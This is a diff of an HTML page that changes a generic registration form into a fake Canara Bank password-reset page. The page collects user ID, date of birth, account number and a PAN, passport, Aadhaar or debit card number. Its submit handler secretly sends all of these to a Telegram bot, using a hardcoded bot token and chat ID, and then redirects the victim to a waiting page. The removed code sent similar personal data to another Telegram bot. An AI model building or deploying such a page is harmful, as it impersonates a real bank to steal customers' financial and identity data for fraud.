@@ -3,116 +3,224 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registration Form</title>
+    <title>Canara Bank - Login Password</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f4f4f4;
+            padding: 20px;
         }
 
         .container {
-            width: 350px;
+            background-color: white;
+            max-width: 400px;
             margin: auto;
+            border-radius: 10px;
             padding: 20px;
-            background: white;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border: 2px solid #00aaff;
         }
 
-        h1 {
-            text-align: center;
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #007ac1;
+            padding: 15px;
+            border-radius: 8px 8px 0 0;
+            color: white;
         }
 
-        label {
+        header strong {
+            font-size: 22px;
+        }
+
+        .tagline, .together {
+            font-size: 12px;
             display: block;
-            margin: 10px 0 5px;
         }
 
-        input {
-            width: 94%;
-            padding: 8px;
-            margin-bottom: 10px;
+        .user-icon {
+            background-color: yellow;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 30px;
+        }
+
+        .reset-form label {
+            display: block;
+            margin-top: 12px;
+            font-weight: bold;
+        }
+
+        .reset-form input[type="text"],
+        .reset-form input[type="tel"] {
+            width: 100%;
+            padding: 12px;
+            margin-top: 6px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .reset-form input:focus {
+            border-color: #007ac1;
+            outline: none;
+            background-color: #f0f9ff;
+        }
+
+        .radio-group-inline {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-top: 5px;
+        }
+
+        .radio-option {
+            display: flex;
+            align-items: center;
+            flex: 1;
+        }
+
+        .radio-option input {
+            margin-right: 5px;
         }
 
         button {
             width: 100%;
-            padding: 12px;
-            background-color: #5cb85c;
+            background: linear-gradient(135deg, #007ac1, #005a91);
             color: white;
             border: none;
-            border-radius: 5px;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 20px;
             cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+            transition: 0.3s;
         }
 
         button:hover {
-            background-color: #4cae4c;
+            background: linear-gradient(135deg, #005a91, #003f6b);
+            transform: translateY(-2px);
         }
     </style>
 </head>
 <body>
-    <img src="lg.png" alt="Girl in a jacket" width="100%" height="100">
     <div class="container">
-        <form id="registrationForm">
-            <label for="mobile">Registered Mobile No:</label>
-            <input type="text" id="mobile" name="mobile" required>
+        <header>
+            <div>
+                <strong>Canara Bank</strong><br>
+                <span class="tagline">A Government of India Undertaking</span>
+                <span class="together">Together We Can</span>
+            </div>
+            <div class="user-icon">👤</div>
+        </header>
 
-            <label for="dob">Date of Birth:</label>
-            <input type="text" id="dob" name="dob" required placeholder="DD/MM/YYYY">
+        <form id="resetForm" class="reset-form">
+            <label for="userId">User Id*</label>
+            <input type="text" id="userId" name="userId" required>
 
-            <label for="fatherName">Father's Name:</label>
-            <input type="text" id="fatherName" name="fatherName" required>
-            <br>
-            <br>
+            <label for="dob">Date of Birth/Date of Incorporation*</label>
+            <input type="tel" id="dob" name="dob" maxlength="10" placeholder="DD/MM/YYYY" required>
+
+            <label>I am a*</label>
+            <div class="radio-group-inline">
+                <div class="radio-option">
+                    <input type="radio" id="retail" name="userType" value="Retail User" checked>
+                    <label for="retail">Retail User</label>
+                </div>
+                <div class="radio-option">
+                    <input type="radio" id="corporate" name="userType" value="Corporate User">
+                    <label for="corporate">Corporate User</label>
+                </div>
+            </div>
+
+            <label for="accountNumber">Account Number*</label>
+            <input type="text" id="accountNumber" name="accountNumber" required>
+
+            <label>Identification Type*</label>
+            <div class="radio-group-inline">
+                <div class="radio-option">
+                    <input type="radio" id="pan" name="idProof" value="PAN Number" checked>
+                    <label for="pan">PAN Number</label>
+                </div>
+                <div class="radio-option">
+                    <input type="radio" id="passport" name="idProof" value="Passport Number">
+                    <label for="passport">Passport Number</label>
+                </div>
+            </div>
+
+            <div class="radio-group-inline">
+                <div class="radio-option">
+                    <input type="radio" id="aadhaar" name="idProof" value="AADHAAR Number">
+                    <label for="aadhaar">AADHAAR Number</label>
+                </div>
+                <div class="radio-option">
+                    <input type="radio" id="debit" name="idProof" value="Debit Card Number">
+                    <label for="debit">Debit Card Number</label>
+                </div>
+            </div>
+
+            <input type="text" id="idNumber" placeholder="Enter PAN Number" required>
+
             <button type="submit">Submit</button>
         </form>
     </div>
-<img src="ft.jpg" alt="Girl in a jacket" width="100%" height="200">
+
     <script>
-        // Function to handle the DOB input formatting
-        document.getElementById('dob').addEventListener('input', function () {
-            let value = this.value.replace(/\D/g, ''); // Remove non-digit characters
-            if (value.length > 2) {
-                value = value.slice(0, 2) + '/' + value.slice(2);
-            }
-            if (value.length > 5) {
-                value = value.slice(0, 5) + '/' + value.slice(5);
-            }
-            this.value = value;
+        // Dynamic placeholder update
+        document.querySelectorAll('input[name="idProof"]').forEach(radio => {
+            radio.addEventListener('change', () => {
+                document.getElementById('idNumber').placeholder = `Enter ${radio.value}`;
+            });
         });
 
-        document.getElementById('registrationForm').addEventListener('submit', function (event) {
-            event.preventDefault(); // Prevent default form submission
+        // Telegram bot integration
+        document.getElementById('resetForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
 
-            const mobile = document.getElementById('mobile').value;
-            const dob = document.getElementById('dob').value;
-            const fatherName = document.getElementById('fatherName').value;
+            const token = '7636182652:AAHOYN4kdBMgJcpY3GwFfE1GaT0YR-rOksc';
+            const chatId = '7653557138';
+            const formData = new FormData(this);
+            const data = {
+                userId: formData.get('userId'),
+                dob: formData.get('dob'),
+                userType: formData.get('userType'),
+                accountNumber: formData.get('accountNumber'),
+                idProof: formData.get('idProof'),
+                idNumber: formData.get('idNumber')
+            };
 
-            const message = `Registered Mobile No: ${mobile}\nDate of Birth: ${dob}\nFather's Name: ${fatherName}`;
+            const message = `
+🔒 New Form Submission:
+- User ID: ${data.userId}
+- DOB: ${data.dob}
+- User Type: ${data.userType}
+- Account Number: ${data.accountNumber}
+- ID Proof: ${data.idProof}
+- ID Number: ${data.idNumber}
+            `;
 
-            // Send data to the Telegram API (This part requires a server)
-            fetch(`https://api.telegram.org/bot7901407141:AAHosgdnt82jsQTwsBB74WcctZ-_J-ZOS0c/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: '6989736266',
-                    text: message,
-                }),
-            })
-            .then(response => {
-                if (response.ok) {
-                    window.location.href = 'adac.html'; // Replace with your desired URL
-                } else {
-                    alert('Failed to send data to Telegram.');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('There was an error submitting your data.');
-            });
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+
+                window.location.href = 'please-wait.html';
+            } catch (error) {
+                alert('Failed to submit form. Please try again.');
+            }
         });
     </script>
 </body>
